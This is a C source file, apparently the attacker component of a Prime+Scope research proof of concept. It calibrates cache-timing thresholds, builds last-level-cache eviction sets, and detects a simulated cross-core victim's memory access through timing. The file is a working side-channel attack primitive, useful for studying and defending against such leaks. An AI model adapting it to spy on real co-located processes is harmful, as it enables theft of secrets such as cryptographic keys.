#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#define ASSERT(x) assert(x != -1)

// Consider this file only if the target machine has non-inclusive caches
// according to configuration.h
#include "configuration.h"
#ifdef LLC_NONINCLUSIVE


#include "prime.h"
#include "../utils/colors.h"
#include "../utils/cache_utils.h"
#include "../utils/memory_utils.h"
#include "../utils/misc_utils.h"

// Evset functions
#include "../evsets/list/list_traverse.h"
#include "../evsets/list/list_utils.h"
#include "../evsets/ps_evset.h"

////////////////////////////////////////////////////////////////////////////////
// Shared Memory Allocations
extern volatile uint64_t *shared_mem;
extern volatile uint64_t *synchronization;
extern volatile uint64_t *synchronization_params;

////////////////////////////////////////////////////////////////////////////////
// Function declarations

void test_eviction_set_creation();
void test_primescope();

int configure_thresholds(
  uint64_t target_addr, int *thrL1, int *thrL2, int *thrLLC);

////////////////////////////////////////////////////////////////////////////////
// The attacker()

// First, a helper thread is needed for both eviction set construction and
// threshold finding, hence eviction memory is declared globally, so that both
// threads can access that memory region. Also, for Prime+Scope on the
// non-inclusive caches, it is better to have two eviction sets, and make an
// alternating use of them for consecutive prime's.
uint64_t *evict_memA, *evict_memB;
void attacker_helper();


void attacker(int test_option) {

  ASSERT(mem_map_shared(&evict_memA, EVICT_LLC_SIZE, HUGE_PAGES_AVAILABLE));
  ASSERT(mem_map_shared(&evict_memB, EVICT_LLC_SIZE, HUGE_PAGES_AVAILABLE));

  if (fork() == 0) {
    set_core(HELPER_CORE, "Attacker Helper");
    attacker_helper();
    return;
  }

  if (test_option == 0) test_primescope();
  else                  test_eviction_set_creation();

  ASSERT(munmap(evict_memA,  EVICT_LLC_SIZE));
  ASSERT(munmap(evict_memB,  EVICT_LLC_SIZE));

  // Shut Down
  *synchronization = -1;
  sleep(1);
}


////////////////////////////////////////////////////////////////////////////////

void test_primescope() {

  //////////////////////////////////////////////////////////////////////////////
  // Include the function macros
  #include "macros.h"

  //////////////////////////////////////////////////////////////////////////////
  // Pick a target_addr from shared_mem

  int seed = time(NULL); srand(seed);

#if RANDOMIZE_TARGET == 1
  int target_index = (rand()&((1<<10) - 1))*8;
#else
  int target_index = 0;
#endif

  uint64_t target_addr = (uint64_t)&shared_mem[target_index];

  //////////////////////////////////////////////////////////////////////////////
  // Prepare for Test
  int t, i;

  // Somehow, this is needed for accurate timing measurements
  for (t=0; t<40000; t++)
    BUSY_WAIT();

  //////////////////////////////////////////////////////////////////////////////
  // Cache Access Thresholds

  int thrL1, thrL2, thrLLC;
  ASSERT(configure_thresholds(target_addr, &thrL1, &thrL2, &thrLLC));

  printf("\nThresholds Configured\n\n");
  printf("\tL1  : %u\n", thrL1   );
  printf("\tL2  : %u\n", thrL2   );
  printf("\tLLC : %u\n", thrLLC  );

  //////////////////////////////////////////////////////////////////////////////
  // Eviction Set Construction (Two sets, see comments above attacker())

  Elem *evsetListA, *evsetListB;

  for (i=0; i<2; i++) {

    uint64_t *evict_mem  = (i==0) ? evict_memA : evict_memB;
    Elem **evsetList_ptr = (i==0) ? &evsetListA : &evsetListB;

#if PREMAP_PAGES == 1
  ps_evset_premap(evict_mem);
#endif

    int attempt_counter = 0;
repeat_evset:
    if (PS_SUCCESS != ps_evset_llc( evsetList_ptr,
                                    (char*)target_addr,
                                    CD_WAYS,
                                    evict_mem,
                                    HUGE_PAGES_AVAILABLE,
                                    CONTENTION_CD,
                                    thrLLC,
                                    thrL2,
                                    synchronization,
                                    synchronization_params)) {
      if (++attempt_counter < MAX_EVSET_CONST_RETRY)
        goto repeat_evset;
    }

    if (attempt_counter < MAX_EVSET_CONST_RETRY) {
      printf("\nEviction set %d is constructed successfully\n\n", i);

      printf("\tEviction set addresses are: ");
      print_list(*evsetList_ptr);
    }
    else {
      printf("\nEviction set %d is construction failed\n\n", i);
      return;
    }
  }

  //////////////////////////////////////////////////////////////////////////////
  // Only need helper for EV construction
  KILL_HELPER();

  //////////////////////////////////////////////////////////////////////////////
  // Prepare the Scope Line
  // Convert the eviction set link-list to an array,
  // and set its first element as the scope_addr


  uint64_t evsetA[CD_WAYS];
  uint64_t evsetB[CD_WAYS];
  list_to_array(evsetListA, evsetA); uint64_t scope_addrA = evsetA[0];
  list_to_array(evsetListB, evsetB); uint64_t scope_addrB = evsetB[0];

  //////////////////////////////////////////////////////////////////////////////
  // Prime+Scope (Toy Example)

  printf("\nTesting Prime+Scope\n\n");

  // Set cache initial state
  FLUSH(target_addr);
  //for (i=0; i < 10; i++){ PRIME(evsetListB); };
  //for (i=0; i < 10; i++){ PRIME(evsetListA); };
  for (i=0; i < 20; i++){ PRIME(evsetListB); };
  for (i=0; i < CD_WAYS; i++){ FLUSH(evsetB[i]); };
  for (i=0; i < 1; i++){ PRIME(evsetListB); };

  int access_time, success=0;

  for (t=0; t<TEST_LEN; t++) {

    PRIME(evsetListA);
    TIME_READ_ACCESS(scope_addrA);
    TIME_READ_ACCESS(scope_addrA);

    // Sanity check: the scope_addr is in low-level cache (L1).

    if (access_time<thrL1+10) {
    //if (access_time>thrL2) {
          success++;
          printf(GREEN"\tSuccess at test %d %d\n"NC, t, access_time);
    }
    else  printf(RED  "\tFailure at test %d %d\n"NC, t, access_time);

    // /////////////////////////////////////////////////////////////////////////

    PRIME(evsetListB);
    TIME_READ_ACCESS(scope_addrB);    // SCOPE
    TIME_READ_ACCESS(scope_addrB);    // SCOPE
    VICTIM_READ_ACCESS(target_addr);  // Cross-core access to monitored set
    TIME_READ_ACCESS(scope_addrB);    // SCOPE detects access

    // The victim access to the target address should evict the scope_addr from all cache levels.

    if (access_time>thrL2) {
          success++;
          printf(GREEN"\tSuccess at test %d %d\n\n"NC, t, access_time);}
    else  printf(RED  "\tFailure at test %d %d\n\n"NC, t, access_time);
  }

  printf("\tSuccess %d/%d\n", success, 2*TEST_LEN);
}

////////////////////////////////////////////////////////////////////////////////

void test_eviction_set_creation() {

  //////////////////////////////////////////////////////////////////////////////
  // Include the function macros
  #include "macros.h"

  //////////////////////////////////////////////////////////////////////////////
  // Prepare for Test

  int t, i;
  int attempt_counter;
  struct timespec tstart={0,0}, tend={0,0};
  double timespan;
  int seed = time(NULL); srand(seed);

  // Somehow, this is needed on the tested machines for accurate timings
  for (t=0; t<40000; t++)
    BUSY_WAIT();

  //////////////////////////////////////////////////////////////////////////////
  // Cache Access Thresholds

  uint64_t target_addr = (uint64_t)&shared_mem[0];
  int thrL1, thrL2, thrLLC;
  ASSERT(configure_thresholds(target_addr, &thrL1, &thrL2, &thrLLC));

  printf("\nThresholds Configured\n\n");
  printf("\tL1    : %u\n", thrL1   );
  printf("\tL2    : %u\n", thrL2   );
  printf("\tLLC   : %u\n", thrLLC  );

  //////////////////////////////////////////////////////////////////////////////
  // Ensure pages are mapped

#if PREMAP_PAGES == 1
  ps_evset_premap(evict_memA);
#endif

  //////////////////////////////////////////////////////////////////////////////
  // Test loop

  printf("\nTesting Eviction Set Construction Performance\n\n");

  for (t=0; t<TEST_LEN; t++) {

    ////////////////////////////////////////////////////////////////////////////
    // Pick a new target_addr from shared_mem

#if RANDOMIZE_TARGET == 1
  int target_index = (rand()& ( (1<<10) - 1) );
#else
    int target_index = t;
#endif
    target_addr = (uint64_t)&shared_mem[target_index*8];

    ////////////////////////////////////////////////////////////////////////////
    // Renew Cache Access Thresholds at ever test, if requested

#if RENEW_THRESHOLD == 1
    ASSERT(configure_thresholds(target_addr, &thrL1, &thrL2, &thrLLC));
#endif

    ////////////////////////////////////////////////////////////////////////////
    // Eviction Set Construction

    #define CONTENTION_TARGET CONTENTION_CD // or CONTENTION_LLC

    Elem  *evsetList;

    attempt_counter = 0;

    clock_gettime(CLOCK_MONOTONIC, &tstart);
repeat_evset:
    if (PS_SUCCESS != ps_evset_llc(
                        &evsetList,
                        (char*)target_addr,
                        (CONTENTION_TARGET==CONTENTION_CD) ? CD_WAYS : LLC_WAYS,
                        evict_memA,
                        HUGE_PAGES_AVAILABLE,
                        CONTENTION_TARGET,
                        thrLLC,
                        thrL2,
                        synchronization,
                        synchronization_params)) {
      if (++attempt_counter < MAX_EVSET_CONST_RETRY)
        goto repeat_evset;
    }
    clock_gettime(CLOCK_MONOTONIC, &tend);

    timespan = ((double)tend.tv_sec  *1.0e3 + tend.tv_nsec  *1.0e-6) -
               ((double)tstart.tv_sec*1.0e3 + tstart.tv_nsec*1.0e-6);

    if (attempt_counter<MAX_EVSET_CONST_RETRY) {
      printf(GREEN"\tConstruction Succeeded. With %d retries and in %f ms\n"NC,
        attempt_counter, timespan);

        if (ps_evset_test(&evsetList,
                        (char*)target_addr,
                        (CONTENTION_TARGET==CONTENTION_CD) ? thrL2 : thrLLC,
                        100,
                        EVTEST_MEDIAN,
                        CONTENTION_TARGET)) {
          printf(GREEN"\t  Eviction Success\n"NC);
        }
        else
          printf(RED"\t  Eviction Failed\n"NC);
    }
    else
      printf(RED"\tConstruction Failed. With %d retries\n"NC,
        attempt_counter);
  }
}


int configure_thresholds(
  uint64_t target_addr, int *thrL1, int *thrL2, int *thrLLC) {

  #define THRESHOLD_TEST_COUNT 1000

  //////////////////////////////////////////////////////////////////////////////
  // Construct an L1 Eviction Set

  uint64_t *evict_mem_l1;
  ASSERT(mem_map_private(&evict_mem_l1, EVICT_L1_SIZE, HUGE_PAGES_AVAILABLE));
  Elem  *evsetList_L1;
  if (PS_SUCCESS != ps_evset_l1(&evsetList_L1,
                                (char*)target_addr,
                                L1_WAYS+2,
                                evict_mem_l1,
                                HUGE_PAGES_AVAILABLE))
    return -1;

  //////////////////////////////////////////////////////////////////////////////
  // Construct an L2 Eviction Set

#if HUGE_PAGES_AVAILABLE == 1
  uint64_t *evict_mem_l2;
  ASSERT(mem_map_private(&evict_mem_l2, EVICT_L2_SIZE, HUGE_PAGES_AVAILABLE));
  Elem  *evsetList_L2;
  if (PS_SUCCESS != ps_evset_l2(&evsetList_L2,
                                (char*)target_addr,
                                L2_WAYS+2,
                                evict_mem_l2,
                                HUGE_PAGES_AVAILABLE))
    return -1;
#endif

  //////////////////////////////////////////////////////////////////////////////
  // Measure cache access timings

  int time_L1 [THRESHOLD_TEST_COUNT];
  int time_L2 [THRESHOLD_TEST_COUNT];
  int time_LLC[THRESHOLD_TEST_COUNT];
  int time_RAM[THRESHOLD_TEST_COUNT];

  int i;
  for (i=0; i<THRESHOLD_TEST_COUNT; i++) {
    clflush_f((void*)target_addr);
    time_mread((void*)target_addr);
    time_L1[i] = time_mread((void*)target_addr);
    traverse_list_asm_skylake(evsetList_L1);
    traverse_list_asm_skylake(evsetList_L1);
    time_L2[i] = time_mread((void*)target_addr);
  #if HUGE_PAGES_AVAILABLE
    traverse_list_asm_skylake(evsetList_L2);
    traverse_list_asm_skylake(evsetList_L2);
    traverse_list_asm_skylake(evsetList_L2);
    traverse_list_asm_skylake(evsetList_L2);
  #else
    asm volatile("lfence;mfence");
    HELPER_READ_ACCESS(target_addr);
    asm volatile("lfence;mfence");
  #endif
    time_LLC[i] = time_mread((void*)target_addr);
    clflush_f((void*)target_addr);
    time_RAM[i] = time_mread((void*)target_addr);
  }

  //////////////////////////////////////////////////////////////////////////////
  // De-Allocate the Eviction Set Memory

  ASSERT(munmap(evict_mem_l1, EVICT_L1_SIZE));
#if HUGE_PAGES_AVAILABLE == 1
  ASSERT(munmap(evict_mem_l2, EVICT_L2_SIZE));
#endif

  //////////////////////////////////////////////////////////////////////////////
  // Calculate Thresholds

  int tL1  = median(time_L1 , THRESHOLD_TEST_COUNT);
  int tL2  = median(time_L2 , THRESHOLD_TEST_COUNT);
  int tLLC = median(time_LLC, THRESHOLD_TEST_COUNT);
  int tRAM = median(time_RAM, THRESHOLD_TEST_COUNT);

#if (HUGE_PAGES_AVAILABLE == 0) && (defined LLC_NONINCLUSIVE)
  tLLC = 80; // Static LLC timing
  printf(ORANGE"\n\tWARNING: for this configuration (non-inclusive Intel LLC + small pages), the LLC threshold has been set statically instead of dynamically. \n");
  printf(NC"\t-> if the PoC does not work (e.g., EV construction fails) consider tweaking this threshold.\n\n");
#endif


  printf("\tL1  : %u\n", tL1   );
  printf("\tL2  : %u\n", tL2   );
  printf("\tLLC : %u\n", tLLC  );
  printf("\tRAM : %u\n", tRAM  );

  *thrL1  = (tL1  + tL2 ) / 2;
  *thrL2  = (tL2  + tLLC) / 2;
  *thrLLC = (tLLC + tRAM) / 2;

  return 0;
}


#endif